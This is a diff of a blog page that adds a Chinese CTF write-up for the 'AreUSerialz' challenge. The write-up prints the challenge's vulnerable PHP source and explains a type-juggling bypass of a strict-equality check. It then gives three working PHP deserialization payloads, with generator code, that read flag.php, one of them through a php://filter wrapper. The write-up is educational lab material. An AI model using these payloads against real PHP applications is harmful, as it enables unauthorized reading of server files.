@@ -27,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/1iu2y.github.io\/posts\/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3\/"
-        },"genre": "posts","keywords": "CTF, web","wordcount":  3322 ,
+        },"genre": "posts","keywords": "CTF, web","wordcount":  4854 ,
         "url": "https:\/\/1iu2y.github.io\/posts\/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3\/","datePublished": "2021-07-19T17:02:23+08:00","dateModified": "2021-07-19T17:02:23+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -104,8 +104,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">BUUCTF web记录3</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/liuliuliuzy" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>zyleo</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-07-19">2021-07-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3322 字&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 7 分钟&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-07-19">2021-07-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 4854 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 10 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>目录</span>
@@ -140,6 +140,15 @@
       </ul>
     </li>
     <li><a href="#0x04-ciscn2019-华北赛区-day2-web1hack-world">0x04 [CISCN2019 华北赛区 Day2 Web1]Hack World</a></li>
+    <li><a href="#0x05-网鼎杯-2020-青龙组areuserialz">0x05 [网鼎杯 2020 青龙组]AreUSerialz</a>
+      <ul>
+        <li><a href="#payload1">payload1</a></li>
+        <li><a href="#payload2">payload2</a></li>
+        <li><a href="#payload3">payload3</a></li>
+        <li><a href="#总结">总结</a></li>
+        <li><a href="#参考链接-4">参考链接</a></li>
+      </ul>
+    </li>
   </ul>
 </nav></div>
             </div><div class="content" id="content"><h2 id="0x00-极客大挑战-2019babysql">0x00 [极客大挑战 2019]BabySQL</h2>
@@ -699,7 +708,332 @@ Your password is &#39;flag{b11bfeba-d864-4a0a-97f6-77e3ef266da9}&#39;
 
 </code></pre></td></tr></table>
 </div>
-</div></div><div class="post-footer" id="post-footer">
+</div><h2 id="0x05-网鼎杯-2020-青龙组areuserialz">0x05 [网鼎杯 2020 青龙组]AreUSerialz</h2>
+<p><a href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz" target="_blank" rel="noopener noreffer">题目链接</a></p>
+<p>这是一道反序列化的题，可以看到源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+
+<span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
+
+<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+
+<span class="k">class</span> <span class="nc">FileHandler</span> <span class="p">{</span>
+
+    <span class="k">protected</span> <span class="nv">$op</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$filename</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$content</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$op</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span><span class="p">;</span>
+        <span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;/tmp/tmpfile&#34;</span><span class="p">;</span>
+        <span class="nv">$content</span> <span class="o">=</span> <span class="s2">&#34;Hello World!&#34;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">process</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">process</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">();</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">==</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">();</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Bad Hacker!&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">write</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Too long!&#34;</span><span class="p">);</span>
+                <span class="k">die</span><span class="p">();</span>
+            <span class="p">}</span>
+            <span class="nv">$res</span> <span class="o">=</span> <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Successful!&#34;</span><span class="p">);</span>
+            <span class="k">else</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Failed!&#34;</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Failed!&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">read</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$res</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$res</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">output</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&#34;[Result]: &lt;br&gt;&#34;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="nv">$s</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">===</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">process</span><span class="p">();</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">is_valid</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">&gt;=</span> <span class="mi">32</span> <span class="o">&amp;&amp;</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">125</span><span class="p">))</span>
+            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">{</span><span class="s1">&#39;str&#39;</span><span class="p">}))</span> <span class="p">{</span>
+
+    <span class="nv">$str</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">is_valid</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$obj</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>定义了一个<code>FileHandler</code>类，并且会将接受到的<code>$_GET['str']</code>请求参数进行反序列化。</p>
+<p>感觉应该是要反序列化得到<code>FileHandler</code>对象，然后通过<code>__construct()</code>或<code>__destruct()</code>魔术方法来读取<code>flag.php</code>的内容。</p>
+<p>类的<code>$op</code>变量为1对应写操作，2对应读操作。</p>
+<p><code>__construct()</code>里面写死了<code>$op=&quot;1&quot;</code>，所以无法执行<code>process()</code>中的读取操作。</p>
+<p>但是<code>__destruct()</code>里又会将<code>$op</code>从2变为1，所以需要想办法绕过这一逻辑。绕过的利用点就在于，这里使用的判断逻辑是强相等<code>===</code>，所以将<code>$op</code>定义为数字类型2，就可以绕过该判断，同时满足<code>process()</code>函数中的<code>$op==&quot;2&quot;</code>判断，因为这里是弱相等，存在自动类型转换。</p>
+<p>需要注意的是：</p>
+<ul>
+<li>
+<p><del>方便起见，<code>flag.php</code>利用php的<a href="https://www.php.net/manual/en/wrappers.php" target="_blank" rel="noopener noreffer">伪协议</a><code>php://filter/read=convert.base64-encode=flag.php</code>来读取</del></p>
+</li>
+<li>
+<p>php对于<code>private</code>/<code>protected</code>类型的成员变量进行序列化时会加上包含00字节的特殊内容，但是这无法通过<code>$is_valid()</code>判断。可以将序列化结果中的<code>s</code>替换为<code>S</code>，使其后面的内容支持16进制，然后空字节写成<code>\00</code>即可</p>
+<blockquote>
+<p><strong>Note</strong>:</p>
+<p>Object&rsquo;s private members have the class name prepended to the member name; protected members have a &lsquo;*&rsquo; prepended to the member name. These prepended values have null bytes on either side.</p>
+<p><a href="https://www.php.net/manual/en/function.serialize" target="_blank" rel="noopener noreffer">https://www.php.net/manual/en/function.serialize</a></p>
+</blockquote>
+</li>
+</ul>
+<h3 id="payload1">payload1</h3>
+<p>所以，最常规的payload可以通过以下方式生成：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+	<span class="k">class</span> <span class="nc">FileHandler</span> <span class="p">{</span>
+		<span class="k">protected</span> <span class="nv">$op</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+		<span class="k">protected</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
+		<span class="k">protected</span> <span class="nv">$content</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileHandler</span><span class="p">();</span>
+	<span class="nv">$b</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+	<span class="nv">$b</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;s&#34;</span><span class="p">,</span> <span class="s2">&#34;S&#34;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>  
+    <span class="nv">$b</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;%00&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">00&#34;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>  
+	<span class="k">echo</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><a href="https://sandbox.onlinephpfunctions.com/" target="_blank" rel="noopener noreffer">执行</a>结果</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt">O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BS%3A0%3A%22%22%3B%7D
+</code></pre></td></tr></table>
+</div>
+</div><p>请求<code>?str=O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BS%3A0%3A%22%22%3B%7D</code>即可获取flag。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142159687.png" title="image-20210824142159687" data-thumbnail="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142159687.png" data-sub-html="<h2>flag</h2><p>image-20210824142159687</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210824142159687.png"
+            data-srcset="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142159687.png, image-20210824142159687.png 1.5x, /posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142159687.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142159687.png" />
+    </a><figcaption class="image-caption">flag</figcaption>
+    </figure></p>
+<h3 id="payload2">payload2</h3>
+<p>还可以利用php的<a href="https://www.php.net/manual/en/wrappers.php" target="_blank" rel="noopener noreffer">伪协议</a>来获取<code>flag.php</code>文件的base64编码，然后再解码，也是一样的。</p>
+<p>payload为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt">O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BS%3A0%3A%22%22%3B%7D
+</code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142639616.png" title="image-20210824142639616" data-thumbnail="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142639616.png" data-sub-html="<h2>payload2</h2><p>image-20210824142639616</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210824142639616.png"
+            data-srcset="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142639616.png, image-20210824142639616.png 1.5x, /posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142639616.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142639616.png" />
+    </a><figcaption class="image-caption">payload2</figcaption>
+    </figure></p>
+<h3 id="payload3">payload3</h3>
+<p>其实，网站信息中显示其使用的php版本为7.4.3，而7.1+版本的php在序列化与反序列化时对于<code>private</code>/<code>protected</code>是不敏感的，所以可以直接把上述的成员变量都当作<code>public</code>。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142739850.png" title="image-20210824142739850" data-thumbnail="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142739850.png" data-sub-html="<h2>wappalyzer结果</h2><p>image-20210824142739850</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210824142739850.png"
+            data-srcset="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142739850.png, image-20210824142739850.png 1.5x, /posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142739850.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142739850.png" />
+    </a><figcaption class="image-caption">wappalyzer结果</figcaption>
+    </figure></p>
+<p>于是可以这样生成payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+	class FileHandler {
+		public $op = 2;
+		public $filename = &#34;php://filter/read=convert.base64-encode/resource=flag.php&#34;;
+		public $content = &#34;&#34;;
+	}
+	$a = new FileHandler();
+	echo(serialize($a));
+?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt">O:11:&#34;FileHandler&#34;:3:{s:2:&#34;op&#34;;i:2;s:8:&#34;filename&#34;;s:57:&#34;php://filter/read=convert.base64-encode/resource=flag.php&#34;;s:7:&#34;content&#34;;s:0:&#34;&#34;;}
+</code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142956654.png" title="image-20210824142956654" data-thumbnail="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142956654.png" data-sub-html="<h2>直接当作public</h2><p>image-20210824142956654</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210824142956654.png"
+            data-srcset="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142956654.png, image-20210824142956654.png 1.5x, /posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142956654.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142956654.png" />
+    </a><figcaption class="image-caption">直接当作public</figcaption>
+    </figure></p>
+<p>同样可以拿到flag。</p>
+<h3 id="总结">总结</h3>
+<p>这题的意义在于<strong>php的序列化与反序列化</strong>、<strong>序列化结果字段的含义</strong>、<strong>php7.1版本对于序列化反序列化操作的变化</strong></p>
+<h3 id="参考链接-4">参考链接</h3>
+<ul>
+<li><a href="https://www.neatstudio.com/show-161-1.shtml" target="_blank" rel="noopener noreffer">PHP 序列化（serialize）格式详解</a></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
